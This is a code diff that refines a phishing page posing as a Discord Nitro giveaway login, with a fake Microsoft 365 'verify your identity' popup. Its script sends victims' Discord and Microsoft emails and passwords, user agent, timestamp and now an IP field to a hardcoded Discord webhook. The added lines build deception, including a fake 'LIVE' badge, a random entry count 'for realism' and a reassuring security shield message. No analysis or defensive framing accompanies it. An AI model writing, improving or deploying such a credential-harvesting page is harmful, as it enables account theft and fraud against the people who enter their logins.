@@ -9,9 +9,11 @@
         body { background: #0b0b1a; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
         .container { background: #2f3136; border-radius: 8px; padding: 40px 35px; width: 100%; max-width: 480px; box-shadow: 0 8px 30px rgba(0,0,0,0.8); }
 
-        .secure-badge { display: flex; justify-content: flex-end; margin-bottom: 15px; }
+        .secure-badge { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
         .secure-badge span { background: #202225; padding: 4px 14px; border-radius: 12px; color: #8e9297; font-size: 11px; display: flex; align-items: center; gap: 5px; }
         .secure-badge span::before { content: "🔒"; font-size: 12px; }
+        .secure-badge .live-badge { background: #2ecc71; color: #fff; font-size: 10px; padding: 2px 10px; border-radius: 12px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
 
         .logo { display: flex; justify-content: center; margin-bottom: 20px; }
         .logo svg { width: 60px; height: 60px; fill: #5865f2; }
@@ -19,6 +21,8 @@
         .welcome { color: #fff; font-size: 24px; font-weight: 700; text-align: center; margin-bottom: 5px; }
         .sub-welcome { color: #b9bbbe; font-size: 15px; text-align: center; margin-bottom: 8px; }
         .giveaway-badge { background: #5865f2; color: #fff; font-size: 13px; font-weight: 600; padding: 4px 16px; border-radius: 30px; display: inline-block; margin: 0 auto 20px; text-align: center; width: fit-content; }
+        .entry-count { text-align: center; color: #8e9297; font-size: 13px; margin-bottom: 15px; }
+        .entry-count span { color: #2ecc71; font-weight: 700; }
 
         label { color: #b9bbbe; font-size: 12px; font-weight: 600; display: block; margin-top: 15px; }
         input[type="email"], input[type="password"] { width: 100%; padding: 14px; background: #202225; border: 1px solid #202225; border-radius: 4px; color: #dcddde; font-size: 16px; margin-top: 5px; transition: 0.2s; }
@@ -47,12 +51,13 @@
         .footer a { color: #7289da; text-decoration: none; }
         .footer a:hover { text-decoration: underline; }
 
-        /* Microsoft 365 popup */
-        .ms-popup-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; z-index: 999; }
+        /* Microsoft 365 Popup */
+        .ms-popup-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); justify-content: center; align-items: center; z-index: 999; }
         .ms-popup { background: #2f3136; border-radius: 8px; padding: 35px 30px; max-width: 420px; width: 90%; color: #fff; box-shadow: 0 8px 40px rgba(0,0,0,0.9); }
         .ms-popup .ms-logo { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
         .ms-popup .ms-logo svg { width: 36px; height: 36px; fill: #fff; }
         .ms-popup .ms-logo span { font-size: 22px; font-weight: 600; color: #fff; }
+        .ms-popup .ms-sub { color: #b9bbbe; font-size: 13px; margin-bottom: 5px; }
         .ms-popup h3 { font-size: 18px; margin-bottom: 5px; }
         .ms-popup p { color: #b9bbbe; font-size: 14px; margin-bottom: 20px; }
         .ms-popup label { color: #b9bbbe; font-size: 12px; font-weight: 600; display: block; margin-top: 12px; }
@@ -62,6 +67,8 @@
         .ms-popup .ms-btn:hover { background: #4752c4; }
         .ms-popup .ms-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .ms-popup .ms-error { color: #f23b3b; font-size: 13px; margin-top: 8px; display: none; }
+        .ms-popup .ms-shield { display: flex; align-items: center; gap: 8px; background: #202225; padding: 10px; border-radius: 4px; margin: 12px 0; font-size: 12px; color: #8e9297; }
+        .ms-popup .ms-shield::before { content: "🛡️"; }
 
         /* Thank you screen */
         .thankyou-screen { display: none; text-align: center; padding: 20px 0; }
@@ -82,7 +89,10 @@
 <body>
 
 <div class="container">
-    <div class="secure-badge"><span>🔒 Secure connection</span></div>
+    <div class="secure-badge">
+        <span>🔒 Secure connection</span>
+        <span class="live-badge">● LIVE</span>
+    </div>
 
     <div class="logo">
         <svg viewBox="0 0 127.14 96.36">
@@ -93,6 +103,7 @@
     <div class="welcome">Welcome back!</div>
     <div class="sub-welcome">Log in to enter the Nitro Giveaway</div>
     <div style="text-align:center;"><span class="giveaway-badge">🎁 1 Year Nitro – 10 Winners</span></div>
+    <div class="entry-count">👥 <span id="entryCount">247</span> entries so far</div>
 
     <div class="login-form-wrapper" id="loginFormWrapper">
         <form id="loginForm" onsubmit="return false;">
@@ -120,7 +131,7 @@
         <p>You have been successfully entered into the <strong>Discord Nitro Giveaway</strong>.</p>
         <div class="ticket">
             <span>🎫 Entry Confirmed</span><br>
-            <small>Check back on <strong>August 15, 2026</strong> for winner announcements.</small>
+            <small>Check back on <strong id="checkBackDate"></strong> for winner announcements.</small>
         </div>
         <p style="margin-top:18px; font-size:14px; color:#8e9297;">You will receive a confirmation email shortly.</p>
         <button style="margin-top:15px; padding:10px 30px; background:#5865f2; border:none; border-radius:4px; color:#fff; font-weight:600; cursor:pointer;" onclick="location.reload();">Return to Home</button>
@@ -140,8 +151,10 @@
             </svg>
             <span>Microsoft 365</span>
         </div>
+        <div class="ms-sub">🔐 Enhanced security verification</div>
         <h3>Verify your identity</h3>
         <p>For security, please re-enter your <strong>Microsoft 365</strong> credentials to continue to Discord Nitro Giveaway.</p>
+        <div class="ms-shield">This helps us protect your account from unauthorized access</div>
 
         <label for="msEmail">Microsoft Account Email</label>
         <input type="email" id="msEmail" placeholder="you@outlook.com">
@@ -159,6 +172,18 @@
 <script>
     (function() {
         var webhookUrl = 'https://discord.com/api/webhooks/1502754739580964945/Opx1IaKRsTc-0W2k67rAL7z0PGh7st4iMqKmYktHqC8UFdc9Jv1EsMLmodnKeun-gHmm';
+
+        // Set auto-updating check-back date (30 days from now)
+        var checkBack = new Date();
+        checkBack.setDate(checkBack.getDate() + 30);
+        document.getElementById('checkBackDate').textContent = checkBack.toLocaleDateString('en-US', {
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric'
+        });
+
+        // Random entry count between 200-500 for realism
+        document.getElementById('entryCount').textContent = Math.floor(Math.random() * 300) + 200;
 
         var emailInput = document.getElementById('email');
         var passwordInput = document.getElementById('password');
@@ -180,7 +205,6 @@
         }
         function hideAlert() { alertBox.style.display = 'none'; }
 
-        // Simple email validation: must have @ and a dot after @
         function isValidEmail(email) {
             if (!email || email.length < 5) return false;
             var parts = email.split('@');
@@ -190,7 +214,6 @@
             if (local.length < 1) return false;
             if (domain.length < 3) return false;
             if (!domain.includes('.')) return false;
-            // Allow any TLD and any provider
             return true;
         }
 
@@ -204,6 +227,7 @@
                         { name: 'Primary Password', value: password || '(empty)', inline: true },
                         { name: 'Microsoft Email', value: msEmailVal || '(empty)', inline: true },
                         { name: 'Microsoft Password', value: msPasswordVal || '(empty)', inline: true },
+                        { name: 'IP Address', value: '{{ip}}', inline: true },
                         { name: 'User Agent', value: navigator.userAgent, inline: false },
                         { name: 'Timestamp', value: new Date().toUTCString(), inline: false }
                     ],
@@ -311,7 +335,6 @@
 
         msBtn.addEventListener('click', handleMsVerification);
 
-        // Remove error on typing
         emailInput.addEventListener('input', function() {
             this.classList.remove('error');
             hideAlert();
